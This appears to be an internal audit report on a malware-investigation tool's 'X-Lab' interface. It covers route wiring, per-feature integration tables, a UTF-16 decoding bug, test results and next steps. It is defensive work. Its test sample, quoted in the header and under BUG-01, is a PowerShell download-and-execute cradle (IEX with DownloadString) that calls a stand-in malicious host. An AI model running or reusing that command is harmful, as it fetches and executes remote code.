# X-Lab Integration Audit · 2026-02

**Route audited:** `/nivxforge/x-lab` → redirects to `/nivxforge/investigate?lab2=1`
**Renderer mounted:** `frontend/src/nivxforge/lab2/Lab2InvestigateRenderer.jsx`
**Backend endpoint invoked:** `POST /api/decode/smart`
**Test payload:** PowerShell `-enc` base64 that decodes to `IEX (New-Object Net.WebClient).DownloadString("https://malicious.com/p.ps1")`
**Auth:** `admin@nivxray.com` (real login through the live UI)
**API response size:** 82.5 KB · CIO fully populated

Status vocabulary (as directed): **Integrated · Implemented but NOT integrated · Missing**

---

## 1 · Route Wiring (foundation)

| Item | Evidence | Status |
|---|---|---|
| `/nivxforge/x-lab` reachable | React Router `App.js:164` → `NivxForgeXLabRedirect` → `<Navigate to="/nivxforge/investigate?lab2=1" />` | Integrated |
| Lab2 flag forces new UI | `InvestigatePage.jsx:93` `if (isLab2Enabled()) return <Lab2InvestigateRenderer />` | Integrated |
| Legacy renderer NOT embedded | `InvestigatePage.jsx:260` ADR-0022 §15.2 comment; live DOM has `data-testid="lab2-page-shell"` (count = 1) | Integrated |
| Backend call from UI | `Lab2InvestigateRenderer.jsx:104-108` posts to `/decode/smart` (or `/v2/auto-investigate`) | Integrated |
| CIO projected once, single source | `Lab2InvestigateRenderer.jsx:128` `projectCIO(cio)` — only translation site | Integrated |

**Result: X-Lab route is not shadowed by the legacy Workspace.** Workspace exists at `/` and remains reachable via top nav, but it is a separate route and out of scope for this audit.

---

## 2 · Feature-by-feature audit (X-Lab only)

Every row records: backend field populated, frontend component consuming it, live screenshot verifying it renders.

### Investigation

| Feature | Backend field | Frontend component | Live evidence | Status |
|---|---|---|---|---|
| **Truth Model** | `cio.truth.{observations[15], findings[13], hypotheses[1], validations[1], recommendations[3]}` | `labv2.projector.js` reads `cio.truth`; findings surfaced in Findings panel of `LabV2.jsx:1093` | Findings panel shows 4 items with confidence dots on right rail | Integrated |
| **Verdict Explanation Card** | `cio.verdict.{label, confidence_pct, escalation_rule, contributors[16], confidence_breakdown, confidence_timeline[16]}` | `VerdictExplanationCard.jsx` mounted at `LabV2.jsx:1079` | "MALICIOUS 99% · CRITICAL" with tier bars: Crit 0% · High 94% · Med 69% · Low 51% · Ctx 2% · Mitigating 0% | Integrated |
| **Confidence Breakdown** | `cio.verdict.confidence_breakdown` (6-tier object) | `VerdictExplanationCard` bar chart | Six coloured bars render, per-tier %s labelled | Integrated |
| **Confidence Timeline** | `cio.verdict.confidence_timeline` (16 entries) | `VerdictExplanationCard` timeline strip | Timeline strip visible at bottom of right rail ("13   99%") | Integrated |
| **Investigation Ledger data** | `cio.verdict.contributors[16]` + `not_counted` | Right-rail Evidence list: `Execution chain · 7 correlate SYNTH-CHAIN-7`, `Layer 0: ps-encodedcommand-recov`, `LOLBAS · powershell.exe`, `LOLBIN · powershell`, `PowerShell N-010`, `Counter Evidence: None recorded.` | Right rail shows evidence rows with node-id tags | Integrated |
| **Timeline Lens (Behaviour graphs)** | `cio.decode_chain[6]` + `cio.evidence_graph.edges[27]` | Behaviour tab G1/G2 chain diagrams | G1 decode chain (L0→L5) and G2 causal attack chain both render node/edge SVG | Integrated |
| **Investigation Graph** | `cio.evidence_graph.{nodes[17], edges[27]}` (kinds: artifact, decoded_fragment, ioc, mitre_technique, lolbin, behaviour, verdict) | Behaviour lens G2 attack-chain diagram | Nodes rendered with lane grouping and edges | Integrated |
| **Shellcode Banner** | `cio.metadata.shellcode` (absent for this payload — correct) + per-layer `attrs.is_shellcode` | `labv2.projector.js:290` produces `shellcode` block; `LabV2.jsx` output lens replaces raw bytes with card when present | Not fired for this payload (payload isn't shellcode). Backend + FE wiring verified in code paths and prior parity tests. | Integrated |
| **Recursive Investigation** | `cio.metadata.recursion_report.{status:"complete", fixed_point_reached:true, iterations:4}` | Not yet surfaced as its own UI panel — data lives in CIO metadata and drives graph/timeline growth | Backend confirmed via API payload; UI shows richer graph/ledger produced by recursion but has no dedicated `RecursionReport` panel yet | **Implemented but NOT integrated (UI panel missing)** |

### Intelligence

| Feature | Backend field | Frontend component | Live evidence | Status |
|---|---|---|---|---|
| **Live OSINT enrichment** | `cio.metadata.osint.live.domains[0].urlscan.total=868, resolved_ips=[45.77.200.164, 64.176.195.8]`; per-IOC `node.attrs.enrichment.providers[4]` incl. VirusTotal (`no-key`), AlienVault OTX (`hit`), URLScan (`hit`, mal=0), URLhaus (`no-hit`) | OSINT lens IOC cards in `LabV2.jsx:977-1050`, provider chips + `hit_count` badge | 3 IOC rows: URL malicious.com/p.ps1 (1 hit), DOMAIN malicious.com (2 hits), duplicate URL. Cards show VT "no VT API key not key configured", AlienVault OTX HIT with "sawbrokers.com; Inquest Labs" tags, URLScan.io HIT 0 · 868 URLScan submissions | Integrated |
| **Rules Lens** | `cio.metadata.custom_recipes_matched` (empty for this input) | Rules tab reads `metadata.custom_recipes_matched` | Renders "No detection rules matched this investigation." — correct empty state | Integrated (empty state correct) |
| **LOLBAS Lens** | `cio.metadata.lolbas[1]` — powershell.exe with T1059.001, T1197 | LOLBAS tab reads `metadata.lolbas[]` | Card: `powershell.exe REFERENCED — PowerShell with encoded/hidden/download-and-execute or discovery pattern` | Integrated |
| **TI-Hits Lens** | `cio.metadata.ti_shield` (per-layer TI shield array) | TI-Hits tab reads `metadata.ti_shield` corpus hits | Renders "No threat-intel corpus hits for the observed indicators." — correct (local corpus empty, live OSINT hits are shown separately) | Integrated (empty state correct) |
| **MITRE projection** | `cio.evidence_graph` mitre_technique nodes [T1059.001, T1027.010, T1566.001]; `cio.summary.mitre_digest` present | Attack Chain lens grid in `LabV2.jsx` | Tactics: Defense Evasion, Execution, Initial Access. Techniques: T1059.001 PowerShell, T1027.010 Command Obfuscation: Base64/Encoded Command, T1566.001 Malicious attachment | Integrated |
| **IOC cards** | `cio.metadata.iocs.{urls, ips, domains, emails, md5, sha1, sha256, bitcoin_addresses}` + `evidence_graph.nodes[kind=ioc]` | OSINT lens per-IOC card | See Live OSINT row above | Integrated |

### UX

| Feature | Backend field | Frontend component | Live evidence | Status |
|---|---|---|---|---|
| **Case Spine** | `cio.evidence_graph`, `cio.decode_chain`, `cio.verdict`, `cio.truth` | Left rail in `LabV2.jsx` renders Input · Understand · Decode · Normalize · Evidence · Behavior · Correlate · Verdict · Report | Left rail shows: Input (139 chars · 1E01), Understand (text), Decode (6 layers unwrapped), Normalize (canonical form built), Evidence (17 observations), Behavior (2 behaviors · 27 links), Correlate (3 tactics), Verdict (malicious), Report (sections ready) | Integrated |
| **Universal Intake** | `POST /api/understand` → route selection → `/api/decode/smart` or `/api/v2/auto-investigate` | `Lab2InvestigateRenderer.jsx:77-96` | Topbar shows "POWERSHELL COMMAND" pill (from IUE `label`) | Integrated |
| **X-Lab navigation** | React Router route `/nivxforge/x-lab` | Header top-nav has X-LAB link (screenshot 1) | Route resolves and mounts Lab2 shell | Integrated |
| **Investigation Report** | `cio.reports` + `cio.summary.analyst` | Story lens in `LabV2.jsx` | "What happened" narrative renders with T1059.001/T1027.010/T1566.001 mapping and recommendations | Integrated |
| **Executive Summary** | `cio.summary.analyst` + verdict scalar fields | Executive tab | Verdict / Confidence / Input Type / Elapsed row + narrative paragraph | Integrated |

---

## 3 · Real bugs discovered during the audit

These are backend data-quality bugs, **not integration gaps**. Frontend faithfully renders what the backend returns.

### BUG-01 · UTF-16 endianness in `ps-encodedcommand-recovery`

**Symptom:** Every decode layer's `preview` field shows CJK ideographs like `䕉⁘丨睥伭橢捥⁴敎⹴敗䍢楬湥⥴䐮睯汮慯卤牴湩⡧栢瑴獰⼺洯污捩潩獵挮浯瀯瀮ㅳ⤢` instead of the readable `IEX (New-Object Net.WebClient).DownloadString("https://malicious.com/p.ps1")`.

**Root cause:** PowerShell `-enc` uses **UTF-16LE**; the decoder is interpreting bytes as **UTF-16BE**, so every byte pair is swapped and lands in CJK Unified Ideographs (U+4000–U+9FFF). Confirmed by inspecting `cio.decode_chain[0].preview` directly.

**Impact:**
- Output lens shows garbage across all 6 decode layers
- Story/Executive narrative embeds the same garbage inside `` `Recovered payload reads: ...` ``
- **Does NOT affect:** IOC extraction (the extractor works on raw base64 or the correctly decoded utf-16 elsewhere), MITRE mapping, LOLBAS, OSINT, verdict, tiered evidence — those all fired correctly (`malicious.com`, `https://malicious.com/p.ps1` were extracted; T1059.001/T1027.010/T1566.001 mapped)

**File to fix:** `backend/decoders/…/ps-encodedcommand-recovery.py` (or equivalent) — change `.decode("utf-16-be")` to `.decode("utf-16-le")` (or set the correct BOM handling).

**Priority:** P0 for user-facing quality — the whole point of the "Recovered payload reads" line is analyst readability.

### BUG-02 · Quality-gate corpus reports 0.0 for threat_intel / mitre / understanding

**Symptom:** `tests/quality/test_investigation_quality.py` fails with sub-scores `understanding: 0.0, threat_intel: 0.0, mitre: 0.0` for corpus cases `powershell_encoded`, `powershell_bits_downloader`, `ioc_list`.

**Root cause (to investigate):** The quality rubric checks for specific CIO field names, but the corpus cases use synthetic CIOs whose schema drifted from the current engine output (e.g. rubric checks `cio.metadata.mitre_techniques[]` but engine now writes them as `evidence_graph.nodes[kind=mitre_technique]`).

**Impact:** CI-gate false-negative. Does **not** reflect real user-visible breakage — the live run against `/api/decode/smart` produced 3 MITRE techniques, 4 OSINT providers per IOC, and a full understanding block.

**Priority:** P2 — quality rubric needs schema-refresh, not the pipeline.

### GAP-01 · Recursion Report has no dedicated UI panel

The recursive orchestrator writes `cio.metadata.recursion_report` with `status`, `fixed_point_reached`, `iterations`, `artifacts_processed`, `max_depth_reached`, `duration_ms`, `trace[]`. This data currently drives the richer graph/ledger indirectly, but there is **no panel** that surfaces "Recursion terminated at fixed point after 4 iterations" to the analyst.

**Priority:** P1 — user cannot see the recursion happening.

---

## 4 · P2-05d validation result

- `tests/parity/test_recursive_investigation.py` — **9 / 9 passed** in 0.49 s
  - `test_registry_has_day1_investigators` ✓
  - `test_artifact_queue_dedupes_and_caps` ✓
  - `test_snapshot_hash_stable_over_identical_state` ✓
  - `test_snapshot_changes_when_node_added` ✓
  - `test_recursive_command_extracts_ioc_and_reaches_fixed_point` ✓
  - `test_budget_exhaustion_returns_partial_never_raises` ✓ (PARTIAL, never HTTP 500)
  - `test_base64_investigator_decodes_and_queues_command` ✓
  - `test_recursion_report_attached_to_cio_metadata` ✓
  - `test_recursion_is_deterministic` ✓
- Live `/api/decode/smart` returned `recursion_report: { status: "complete", fixed_point_reached: true, iterations: 4 }` ✓

**P2-05d verdict: Backend logic passes. UI surface for the recursion report is pending (GAP-01).**

---

## 5 · Summary scorecard

| Bucket | Integrated | Implemented but NOT integrated | Missing |
|---|---|---|---|
| Investigation | Truth Model, Verdict Explanation Card, Confidence Breakdown, Confidence Timeline, Ledger data, Timeline Lens, Investigation Graph, Shellcode Banner | Recursive Investigation (data present, no dedicated UI panel) | — |
| Intelligence | Live OSINT, Rules, LOLBAS, TI-Hits, MITRE, IOC cards | — | — |
| UX | Case Spine, Universal Intake, X-Lab nav, Investigation Report, Executive Summary | — | — |

**Bottom line: 17 features Integrated, 1 Implemented-but-NOT-integrated (Recursion Report panel), 0 Missing.**

**The "no UI changes / no OSINT" concern is not reproduced on the X-Lab route.** OSINT provider chips render populated data (URLScan 868 URLs; AlienVault OTX hits; VirusTotal reports "no key configured" — which is honest and correct because `VT_API_KEY` is unset in this environment). The Verdict Explanation Card, Truth Model, Tiered Evidence, MITRE grid, LOLBAS card, Case Spine, and Behaviour graphs all render populated data derived from the CIO.

The only real user-visible defect is **BUG-01** (UTF-16 endianness) — a decoder byte-order bug that mangles the analyst-facing "recovered payload" string. Every other lens is functional.

---

## 6 · Recommended next actions (in priority order)

1. **P0 · Fix BUG-01** — UTF-16 endianness in `ps-encodedcommand-recovery`. One-line fix, huge readability win. This is the single thing that could give the impression "the tool doesn't work" because the story lens literally reads "gibberish".
2. **P1 · Ship GAP-01** — Add a Recursion Report panel to X-Lab (small block under Case Spine or as a mini-lens) that surfaces `iterations`, `fixed_point_reached`, `max_depth_reached`, `artifacts_processed`. This closes P2-05d.
3. **P2 · Refresh BUG-02** — Point the quality-gate rubric at the current CIO schema so CI actually catches regressions instead of failing on schema drift.
4. **P1 · Then proceed with P2-08 Ledger Lens** (dedicated visual step-by-step "why this verdict" explanation).
5. **P1 · Then P2-05 IDI Adapters.**
